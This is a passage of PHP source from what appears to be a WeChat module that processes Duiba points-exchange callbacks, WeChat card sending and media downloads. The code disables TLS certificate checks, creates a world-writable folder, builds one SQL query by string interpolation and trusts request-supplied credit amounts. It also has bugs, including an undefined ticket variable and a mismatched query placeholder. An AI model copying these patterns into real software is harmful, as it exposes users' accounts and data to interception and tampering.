        $url = buildCreditAutoLoginRequest($cfg['AppKey'], $cfg['appSecret'], $uid, $crdeidt);
        header('location: ' . $url);
    }
    public function doMobileDuibaxf(){
        global $_W, $_GPC;
        include 'duiba.php';
        $settings = $this -> module['config'];
        $request_array = $_GPC;
        $uid = $request_array['uid'];
        foreach ($request_array as $key => $val){
            $unsetkeyarr = array('i', 'do', 'm', 'c');
            if (in_array($key, $unsetkeyarr) || strstr($key, '__')){
                unset($request_array[$key]);
            }
        }
        $ret = parseCreditConsume($settings['AppKey'], $settings['appSecret'], $request_array);
        if (is_array($ret)){
            $insert = array('uniacid' => $_W['uniacid'], 'uid' => $uid, 'bizId' => date('YmdHi') . random(8, 1), 'orderNum' => $request_array["orderNum"], 'credits' => $request_array["credits"], 'params' => $request_array["params"], 'type' => $request_array["type"], 'ip' => $request_array["ip"], 'starttimestamp' => $request_array["timestamp"], 'waitAudit' => $request_array["waitAudit"], 'actualPrice' => $request_array["actualPrice"], 'description' => $request_array["description"], 'facePrice' => $request_array["facePrice"], 'Audituser' => $request_array["Audituser"], 'itemCode' => $request_array["itemCode"], 'status' => 0, 'createtime' => time());
            pdo_insert($this -> modulename . "_dborder", $insert);
            if (pdo_insertid()){
                load() -> model('mc');
                $usercredits = mc_credit_fetch($uid, $types = array('credit1'));
                $yue = intval($usercredits['credit1']) - $request_array["credits"];
                if ($yue > 0){
                    $updatecredit = mc_credit_update($uid, 'credit1', - abs($request_array["credits"]), array("积分宝", "兑吧兑换" . $request_array["description"], 'wdl_jifenbao'));
                    if ($updatecredit){
                        exit(json_encode(array('status' => 'ok', 'errorMessage' => "", 'bizId' => $insert['bizId'], 'credits' => $yue)));
                    }else{
                        exit(json_encode(array('status' => 'fail', 'errorMessage' => "扣除积分错误", 'credits' => $request_array["credits"])));
                    }
                }else{
                    exit(json_encode(array('status' => 'fail', 'errorMessage' => "积分不足", 'credits' => $request_array["credits"])));
                }
            }else{
                exit(json_encode(array('status' => 'fail', 'errorMessage' => "系统错误，请重试！", 'credits' => $request_array["credits"])));
            }
        }else{
            exit(json_encode(array('status' => 'fail', 'errorMessage' => $ret, 'credits' => $request_array["credits"])));
        }
    }
    public function doMobileDuibatz(){
        global $_W, $_GPC;
        include 'duiba.php';
        $settings = $this -> module['config'];
        $request_array = $_GPC;
        foreach ($request_array as $key => $val){
            $unsetkeyarr = array('i', 'do', 'm', 'c');
            if (in_array($key, $unsetkeyarr) || strstr($key, '__')){
                unset($request_array[$key]);
            }
        }
        $ret = parseCreditNotify($settings['AppKey'], $settings['appSecret'], $request_array);
        if (is_array($ret) && $ret['success'] == "true"){
            $order = pdo_fetch("SELECT * FROM " . tablename($this -> modulename . "_dborder") . " WHERE  uniacid = :uniacid AND orderNum = :orderNum ", array(':uniacid' => $_W['uniacid'], ':orderNum' => $ret['orderNum']));
            if ($order['status'] == 0){
                $result = pdo_update($this -> modulename . "_dborder", array('status' => 1, 'endtimestamp' => $request_array['timestamp']), array('id' => $order['id']));
                if (!empty($result)){
                    exit('ok');
                }
            }elseif ($order['status'] == 1){
                exit('ok');
            }
        }elseif (is_array($ret) && $ret['success'] == "false"){
            $order = pdo_fetch("SELECT * FROM " . tablename($this -> modulename . "_dborder") . " WHERE  uniacid = :uniacid  AND ordernum = :ordernum ", array(':uniacid' => $_W['uniacid'], ':orderNum' => $ret['orderNum']));
            if ($order['status'] != 2){
                $result = pdo_update($this -> modulename . "_dborder", array('status' => 2, 'endtimestamp' => $request_array['timestamp']), array('id' => $order['id']));
                if (!empty($result)){
                    $updatecredit = mc_credit_update($request_array["uid"], 'credit1', abs($request_array["credits"]), array("积分宝", "兑吧兑换失败，退还积分"));
                    if (!empty($updatecredit)){
                        exit('ok');
                    }
                }
            }elseif ($order['status'] == 2){
                exit('ok');
            }
        }
    }
    public function doMobileCard(){
        global $_W;
        $this -> sendcardpost($_W['openid'], 'pozm3txI6W-Fcxndth6AlSONkZqE');
    }
    public function sendcardpost($openid, $cardid){
        global $_W;
        $getticket = $this -> getticket();
        $createNonceStr = $this -> createNonceStr();
        $signature = $this -> signature($getticket, $createNonceStr);
        $account = WeAccount :: create();
        $card_ext = array('openid' => $openid, 'timestamp' => strval(TIMESTAMP), 'signature' => $signature,);
        $custom = array('touser' => $_W['openid'], 'msgtype' => 'wxcard', 'wxcard' => array('card_id' => $cardid, 'card_ext' => $card_ext),);
        $account -> sendCustomNotice($custom);
    }
    public function doMobileCardd(){
        $data11 = array('action_name' => "QR_CARD", 'expire_seconds' => 1800, 'action_info' => array('card' => array('card_id' => "pozm3txI6W-Fcxndth6AlSONkZqE", 'is_unique_code' => false, 'outer_id' => 100),),);
        $result = $this -> create_card_qrcode($data11);
        echo '<pre>';
        print_r($result);
        echo "<img src='{$result['show_qrcode_url']}'>";
    }
    public function create_card_qrcode($data){
        $access_token = $this -> getAccessToken();
        $url = "https://api.weixin.qq.com/card/qrcode/create?access_token=" . $access_token;
        $res = $this -> http_web_request($url, json_encode($data));
        return json_decode($res, true);
    }
    protected function http_web_request($url, $data = null){
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
        if (!empty($data)){
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        }
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
        $output = curl_exec($curl);
        curl_close($curl);
        return $output;
    }
    public function getticket(){
        global $_W;
        $data = pdo_fetch("SELECT * FROM " . tablename($this -> modulename . "_ticket") . " WHERE weid = '{$_W['weid']}'");
        if(empty($data)){
            $access_token = $this -> getAccessToken();
            $url = "https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={$access_token}&type=wx_card";
            $json = ihttp_get($url);
            $res = @json_decode($json['content'], true);
            if(empty($ticket)){
                $kjdata = array('weid' => $_W['uniacid'], 'ticket' => $res['ticket'], 'createtime' => TIMESTAMP + 7000,);
                pdo_insert($this -> modulename . "_ticket", $kjdata);
            }
            Return $res['ticket'];
        }else{
            if($data['createtime'] < time()){
                $access_token = $this -> getAccessToken();
                $url = "https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={$access_token}&type=wx_card";
                $json = ihttp_get($url);
                $res = @json_decode($json['content'], true);
                if(empty($ticket)){
                    $kjdata = array('ticket' => $ticket, 'createtime' => TIMESTAMP + 7000,);
                    pdo_update($this -> modulename . "_ticket", $kjdata, array('weid' => $_W['uniacid']));
                }
                Return $res['ticket'];
            }else{
                Return $data['ticket'];
            }
        }
    }
    private function createNonceStr($length = 16){
        $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $str = "";
        for ($i = 0; $i < $length; $i++){
            $str .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
        }
        return $str;
    }
    public function signature($api_ticket, $nonce_str){
        $obj['api_ticket'] = $api_ticket;
        $obj['timestamp'] = TIMESTAMP;
        $obj['nonce_str'] = $nonce_str;
        $signature = $this -> get_card_sign($obj);
        Return $signature;
    }
    public function get_card_sign($bizObj){
        asort($bizObj);
        $buff = "";
        foreach ($bizObj as $k => $v){
            $buff .= $v;
        }
        return sha1($buff);
    }
    public function doMobileUpload(){
        global $_W, $_GPC;
        load() -> classs('weixin.account');
        $accObj = WeixinAccount :: create($_W['uniacid']);
        $access_token = $accObj -> fetch_token();
        $media_id = $_GET['media_id'];
        $url = "http://file.api.weixin.qq.com/cgi-bin/media/get?access_token=" . $access_token . "&media_id=" . $media_id;
        $newfolder = ATTACHMENT_ROOT . 'images' . '/wdl_jifenbao_photos' . "/";
        if (!is_dir($newfolder)){
            mkdir($newfolder, 7777);
        }
        $picurl = 'images' . '/wdl_jifenbao_photos' . "/" . date('YmdHis') . rand(1000, 9999) . '.jpg';
        $targetName = ATTACHMENT_ROOT . $picurl;
        $ch = curl_init($url);
        $fp = fopen($targetName, 'wb');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        echo $picurl;
    }
}

?>